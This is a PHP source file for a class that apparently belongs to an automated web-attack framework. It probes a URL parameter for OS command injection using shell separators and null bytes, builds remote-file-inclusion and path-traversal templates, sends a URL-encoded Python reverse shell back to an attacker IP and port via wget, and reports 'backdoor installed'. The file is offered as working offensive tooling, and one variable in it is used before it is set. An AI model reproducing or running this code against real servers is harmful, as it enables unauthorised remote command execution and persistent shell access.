<?php


class PARAM4COM extends URL{
    var $null_byte;
    var $param ;
    var $value;
    var $html_original ;
    var $dir_remote;
    var $uri2where ;
    var $methode_http ;


    
    public function __construct($eth,$domain,$url,$param,$value,$methode_http) {
        $html_original = array();
        if (empty($param)) return $this->log2error("EMPTY PARAM");
        parent::__construct($eth,$domain,$url);
        $this->null_byte = "%00";
        $this->param = trim($param);
        $this->value = trim($value);
        $this->dir_remote = "../../../../../../../../../../../../../../../../../../../../../../../..";
        $this->uri2where = "id8port = '$this->port2id' AND vhost = '$this->vhost' AND path = '$this->uri_path' AND param = '$this->param' ";
        $this->methode_http = trim($methode_http);
        
        $this->html_original = array();
        $query = "wget --user-agent='$this->user2agent' \"$this->url\" --timeout=10 --tries=2 --no-check-certificate -qO-";

        exec($query,$html_original);
        $this->html_original = $this->chaine($html_original);
        

            $sql_r = "SELECT id8port,vhost,path,param FROM URI WHERE $this->uri2where  ";
            if (!$this->checkBD($sql_r)) {
                $sql_w = "INSERT INTO URI (id8port,vhost,path,param) VALUES ('$this->port2id','$this->vhost','$this->uri_path','$this->param'); ";
                $this->mysql_ressource->query($sql_w);
                //echo "$sql_w\n";
               echo $this->note("Working on PARAM:$this->param for the first time");
            }
            
            if (!$this->web2check_200()){
                $chaine = "Unreachable URL";
                return $this->log2error($chaine);
            }
        
        
    }
 
    public function param2fi($user_agent,$file_path,$cmd,$filter){ // OK
        $this->ssTitre(__FUNCTION__);
        $cmd_exec = "$file_path&cmd=%CMD%";
        $template = str_replace("$this->param=$this->value", "$this->param=$cmd_exec", $this->url);
        $this->param2rce($user_agent,$template,$cmd,$filter);
    }
    
    
    public function param2rce($user_agent,$template,$cmd,$filter){ // OK
        $this->ssTitre(__FUNCTION__);
        $shell = "/bin/bash";
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        
        if(!empty($template)){
            $cmd_value = $this->param2url($template, $cmd);
            $rst_id = $this->param2check($user_agent,$cmd_value,$filter);
            if (!empty($rst_id)) {
                
                
                $cmd_rev_nc = $this->rev8python($attacker_ip, $attacker_port, $shell);
                $cmd_rev_nc = $this->url2encode($cmd_rev_nc);
                $url = $this->param2url($template, $cmd_rev_nc);
                
                if ($this->methode_http=="GET") $template_rec = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$template_rec\" -qO-  ";
                if ($this->methode_http=="POST") $template_rec = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$template_rec\" --data \"$this->param=$cmd_rev_nc\" -qO-  ";
                
                
                $template_shell = str_replace("%CMD%", "%SHELL%", $template_rec);
                $templateB64_shell = base64_encode($template_shell);
                $this->port2shell(base64_encode($template_rec));
                
                $template_exec = str_replace("%CMD%", $cmd_rev_nc, $template_rec);
                $this->service4lan($template_exec, $templateB64_shell, $attacker_port, 'T',"server");
                
                
            }
            $this->pause();
        }
    }

    
    public function param2hash(){
        $this->ssTitre(__FUNCTION__);
        $query = "wget --timeout=2 --tries=2 --no-check-certificate \"$this->http_type://$this->vhost:$this->port$this->uri_path\" -qO- 2>&1 | sha256sum | sed \"s/ -//g\" | grep -Po \"[0-9a-z]{64}\" ";
        return $this->req2BD(__FUNCTION__,"URI",$this->uri2where,$query);
        
    }
    
    
    
    public function param2template($cmd,$filter){
        $this->ssTitre(__FUNCTION__);
        $url_template = "";
        $cmd_exec = "$cmd";
        $url_template = str_replace("$this->param=$this->value", "$this->param=%CMD%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        
        $cmd_exec = "; $cmd";
        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value; ")."%CMD%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        
        $cmd_exec = "; $cmd$this->null_byte";
        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value; ")."%CMD%%NB%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        
        $cmd_exec = " && $cmd";
        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value&& ")."%CMD%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        
        $cmd_exec = " && $cmd$this->null_byte";
        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value&& ")."%CMD%%NB%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        
        
        $cmd_exec = " | $cmd";
        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value | ")."%CMD%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        
        $cmd_exec = " | $cmd$this->null_byte";
        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value | ")."%CMD%%NB%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        
        $cmd_exec = " || $cmd";
        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value || ")."%CMD%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        
        $cmd_exec = " || $cmd$this->null_byte";
        $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value || ")."%CMD%%NB%", $this->url);
        $url = $this->param2url($url_template, $cmd_exec);
        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
            return $url_template;
        }
        return $url_template;
    }
    
    
    public function param2url($template,$cmd_exec){
        $this->ssTitre(__FUNCTION__);
        $this->article("Template", $template);
        $this->article("CMD EXEC", $cmd_exec);
        $template = str_replace('%CMD%', $cmd_exec, $template);
        $template = str_replace('%NB%', $this->null_byte, $template);
        $template = str_replace('%RMT%', $this->dir_remote, $template);
        $template = str_replace('%FILE%', $cmd_exec, $template);
        $this->article("TEMPLATE EXEC", $template);
        return $template;
    }
    
    public function param2check($user2agent,$url,$filter){  
        $this->ssTitre(__FUNCTION__);
        $this->article("Test URL",$url);
         
        if ($this->methode_http==="GET") $query = "wget  \"$url\" --timeout=30 --tries=2 --no-check-certificate -qO- 2> /dev/null | strings  $filter "; // --user-agent='$user2agent' --header=\"Referer: $user2agent\"
        if ($this->methode_http==="POST") $query = "wget  \"$url\" --timeout=30 --tries=2 --no-check-certificate -qO- 2> /dev/null | strings  $filter "; // --user-agent='$user2agent' --header=\"Referer: $user2agent\"
        //$query = "curl --silent --connect-timeout 10 --no-keepalive --retry 2 --user-agent '$user2agent' \"$url\"  $filter ";
        return $this->req_ret_str($query);
    }
    

    
    public function compare2string($string1,$string2){
        
        $this->ssTitre("Diff between original and injected");
        $string1 = strip_tags($string1);
        $string2 = strip_tags($string2);
        $tab1 = explode("\n", $string1);
        $tab2 = explode("\n", $string2);
        if(is_array($tab1) && is_array($tab2)){
            $diff = array_unique(array_diff(array_map("trim", $tab1),array_map("trim", $tab2)));
            $diff = array_filter($diff);
            return $this->chaine($diff);
        }
        return "";
    }
    
    public function param2search($user2agent,$log_path,$cmd,$filter){
        $this->ssTitre(__FUNCTION__);
        $uri_encoded = "$log_path&$cmd";
        $uri_5 = str_replace("$this->param=$this->value", "$this->param=$uri_encoded", $this->uri_path);
        if ($this->url2check($user2agent,"$this->http_type://$this->vhost:$this->port$uri_5",$filter)) {
            $this->note("backdoor installed");
        }
    }
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
}
?>